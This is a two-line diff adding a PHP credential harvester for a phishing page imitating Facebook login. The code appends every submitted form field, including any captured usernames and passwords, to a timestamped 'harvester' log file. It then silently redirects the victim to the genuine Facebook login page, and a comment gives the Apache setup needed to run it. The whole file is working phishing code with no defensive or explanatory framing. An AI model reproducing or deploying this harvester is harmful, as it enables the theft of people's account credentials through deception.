@@ -1,0 +1,2 @@
+<?php $file = 'harvester_2017-03-26 19:27:29.813952.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=https://login.facebook.com/login.php" />
+/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */
